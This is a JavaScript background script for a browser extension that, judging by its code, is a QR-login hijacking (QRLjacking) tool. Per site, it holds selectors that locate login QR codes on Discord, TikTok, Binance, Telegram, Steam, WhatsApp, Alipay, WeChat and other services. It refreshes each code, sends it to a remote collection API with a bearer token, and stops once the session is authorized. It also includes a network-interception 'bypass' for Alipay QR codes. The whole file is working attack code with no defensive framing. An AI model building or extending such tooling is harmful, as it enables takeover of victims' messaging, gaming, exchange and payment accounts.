var sessions = new Map();
var running = false;
var lastSrc = "";

const API_TOKEN = "00000000-0000-0000-0000-000000000000";
const API_URL = "http://127.0.0.1:35000";
const QRCODE_ID = "11111111-1111-1111-1111-111111111111";

var QRRules = new Map();

QRRules.set("discord.com", {
    imgSelector: "div[class*='qrCodeContainer'] svg",
    buttonSelector: "",
    authSelector: "",
});
QRRules.set("www.tiktok.com", {
    imgSelector: "div[data-e2e=qr-code] > canvas",
    buttonSelector: "div[data-e2e=qr-code] > div > button",
    authSelector: "",
});
QRRules.set("accounts.binance.com", {
    imgSelector: "#wrap_app canvas",
    buttonSelector: "#wrap_app button:nth-child(2)",
    authSelector: "",
});
QRRules.set("web.telegram.org", {
    imgSelector: ".auth-image > canvas",
    buttonSelector: "",
    authSelector: "#page-chats"
});
QRRules.set("store.steampowered.com", {
    imgSelector: "__SCAN_ALL__",
    buttonSelector: "",
    authSelector: ""
});
QRRules.set("web.whatsapp.com", {
    imgSelector: "canvas[aria-label='Scan me!'], [data-testid='qrcode'] canvas, ._akau canvas, canvas",
    buttonSelector: "",
    authSelector: ""
});

// New Platforms Added (Revival 3.0 - Verified Selectors)
QRRules.set("roblox.com", { imgSelector: ".cross-device-login-display-code-modal img, .qr-code-container img, .qr-code-image, canvas", buttonSelector: "", authSelector: "" });
QRRules.set("wechat.com", { imgSelector: ".qrcode img, .web_login_qr_code img", buttonSelector: "", authSelector: "" });
QRRules.set("web.wechat.com", { imgSelector: ".qrcode img, .web_login_qr_code img", buttonSelector: "", authSelector: "" });
QRRules.set("bilibili.com", { imgSelector: ".bili-mini-qrcode-img, .bili-mini-login-left-wp img, .qr-code-container img, canvas", buttonSelector: "", authSelector: "" });
QRRules.set("kucoin.com", { imgSelector: "[class^='qrCode--'] img, .login-qr img, canvas", buttonSelector: "", authSelector: "" });
QRRules.set("alipay.com", { imgSelector: "#J-qrcode-container canvas, #J-qrcode canvas, .qrcode-img img", buttonSelector: "", authSelector: "" });
QRRules.set("auth.alipay.com", { imgSelector: "#J-qrcode-container canvas, #J-qrcode canvas, .qrcode-img img", buttonSelector: "", authSelector: "" });
QRRules.set("weibo.com", { imgSelector: ".login-qrcode-content img, .qr_code_img img, canvas", buttonSelector: "", authSelector: "" });

class Session {
    constructor(tab) {
        this.tab = tab;
        this.running = false;
        this.imgSrc = "";
        this.imgSelector = "";
        this.buttonSelector = "";
        this.authSelector = "";
    };

    worker() {
        var session = this;
        var nextRunDelay = 500;

        chrome.tabs.sendMessage(session.tab.id, { message: "get-location" })
            .then((response) => {
                if (response !== undefined) {
                    var host = response.location.host;
                    var o = QRRules.get(host);
                    if (o === undefined && host.startsWith("www.")) {
                        o = QRRules.get(host.substring(4));
                    }
                    if (o === undefined) {
                        o = {
                            imgSelector: "__SCAN_ALL__",
                            buttonSelector: "",
                            authSelector: ""
                        };
                    }
                    if (o !== undefined) {
                        session.imgSelector = o.imgSelector;
                        session.buttonSelector = o.buttonSelector;
                        session.authSelector = o.authSelector || "";
                        session.running = true;
                        chrome.action.setIcon({
                            tabId: session.tab.id,
                            path: "icons/icon16.png"
                        });
                    }
                }
            })
            .catch(() => {
                sessions.delete(session.tab.id);
                return;
            });

        var foundImage = false;
        if (session.imgSelector !== "") {
            nextRunDelay = 1000;
            var msgType = session.imgSelector === "__SCAN_ALL__" ? "scan-all-qr" : "get-image";
            var msgPayload = msgType === "get-image"
                ? { message: "get-image", selector: session.imgSelector }
                : { message: "scan-all-qr" };

            chrome.tabs.sendMessage(session.tab.id, msgPayload)
                .then((response) => {
                    if (response !== undefined) {
                        if (response.imgSrc != "" && session.imgSrc != response.imgSrc) {
                            // new image
                            session.imgSrc = response.imgSrc;
                            foundImage = true;

                            fetch(API_URL + "/qrcode/" + QRCODE_ID, {
                                method: "PUT",
                                mode: "cors",
                                headers: {
                                    "Content-Type": "application/json",
                                    "Authorization": "Bearer " + API_TOKEN
                                },
                                body: JSON.stringify({
                                    id: QRCODE_ID,
                                    source: session.imgSrc,
                                    host: response.host
                                })
                            })
                                .then((response) => {
                                    if (response.status === 200) {
                                        console.log("QR code successfully sent to server for:", response.host);
                                    }
                                })
                                .catch((err) => {
                                    console.error("Failed to send QR to server:", err);
                                });
                        }
                    }
                })
                .catch((error) => {
                    console.error("error sending message to content script:", error);
                });

            if (session.buttonSelector != "") {
                // click a reload button if available
                chrome.tabs.sendMessage(session.tab.id, { message: "click-button", selector: session.buttonSelector })
                nextRunDelay = 1000;
            }
        }
        if (!foundImage) {
            // check if we are not already authenticated
            if (session.authSelector !== "") {
                chrome.tabs.sendMessage(session.tab.id, { message: "item-exists", selector: session.authSelector })
                    .then((response) => {
                        if (response !== undefined) {
                            if (response.exists === true) {
                                // authorized
                                session.running = false;
                                console.log("tab:" + session.tab.id + " authorized - aborting");
                                return;
                            }
                        }
                    })
                    .catch(() => { });
            }
        }

        function tab_callback() {
            if (chrome.runtime.lastError) {
                sessions.delete(session.tab.id);
            } else {
                setTimeout(function () { session.worker() }, nextRunDelay);
            }
        }
        chrome.tabs.get(session.tab.id, tab_callback);
    }
}

chrome.runtime.onMessage.addListener(
    function (request, sender, sendResponse) {
        if (request.message === "qr-auto-detected" && sender.tab) {
            var tab = sender.tab;
            var session = sessions.get(tab.id);
            if (session == undefined) {
                session = new Session(tab);
                session.imgSelector = "";
                session.buttonSelector = "";
                sessions.set(tab.id, session);
            }
            
            // If the host is empty, try to get it from the top-level URL
            var finalHost = request.host;
            if (!finalHost || finalHost === "") {
                try {
                    finalHost = new URL(tab.url).host;
                } catch(e) { }
            }

            if (request.imgSrc && request.imgSrc !== session.imgSrc) {
                session.imgSrc = request.imgSrc;
                console.log("Auto-detected QR on:", finalHost);

                fetch(API_URL + "/qrcode/" + QRCODE_ID, {
                    method: "PUT",
                    mode: "cors",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + API_TOKEN
                    },
                    body: JSON.stringify({
                        id: QRCODE_ID,
                        source: session.imgSrc,
                        host: finalHost
                    })
                })
                .then((response) => {
                    if (response.status === 200) {
                        console.log("Auto-detected QR successfully sent for:", finalHost);
                        chrome.action.setIcon({ tabId: tab.id, path: "icons/icon16.png" });
                    }
                })
                .catch((err) => console.error("Failed to send auto-detected QR:", err));
            }

            if (!session.running) {
                session.worker(); // Start the session worker loop for other checks
            }
        }
    }
);

function extractQR(tabId, selector) {
    //console.log("tabId: " + tabId + " selector:" + selector);
    var img = document.querySelector(selector);
    if (img !== null) {
        if (img.src != lastSrc) {
            //console.log(img.src);
            chrome.runtime.sendMessage({ tabId: tabId, imgSrc: img.src });

        }
    }
    return "";
}

chrome.action.onClicked.addListener((tab) => {
    if (!tab.url.includes("chrome://")) {
        var session = sessions.get(tab.id);
        if (session == undefined) {
            session = new Session(tab);
            session.imgSelector = "";
            session.buttonSelector = "";
            sessions.set(tab.id, session);
        }
        if (session.running) {
            return;
        }

        session.worker();
    }
});

chrome.tabs.onActivated.addListener((activeInfo) => {
    //console.log(activeInfo.tabId);
    var session = sessions.get(activeInfo.tabId);
    if (session !== undefined) {
        if (session.running) {
            chrome.action.setIcon({
                tabId: activeInfo.tabId,
                path: "icons/icon16.png"
            });
            return;
        }
    }
    chrome.action.setIcon({
        tabId: activeInfo.tabId,
        path: "icons/icon16-off.png"
    });
});

// Alipay Tainted Canvas Bypass - Network Interception
chrome.webRequest.onCompleted.addListener(
    function(details) {
        if (details.url && details.url.includes("qr.alipay.com/")) {
            console.log("Intercepted Alipay QR URL via Network:", details.url);
            
            // We need to fetch the actual QR code image generated for this URL or use a generic QR generator API
            // Since we just have the raw string, we will generate a data URI QR code for it
            fetch(`https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(details.url)}`)
                .then(response => response.blob())
                .then(blob => {
                    var reader = new FileReader();
                    reader.onloadend = function() {
                        var base64data = reader.result;
                        fetch(API_URL + "/qrcode/" + QRCODE_ID, {
                            method: "PUT",
                            mode: "cors",
                            headers: {
                                "Content-Type": "application/json",
                                "Authorization": "Bearer " + API_TOKEN
                            },
                            body: JSON.stringify({
                                id: QRCODE_ID,
                                source: base64data,
                                host: "alipay.com"
                            })
                        }).then(() => console.log("Sent intercepted Alipay QR to server"));
                    }
                    reader.readAsDataURL(blob);
                });
        }
    },
    {urls: ["*://qr.alipay.com/*", "*://*.alipay.com/*qr*"]}
);
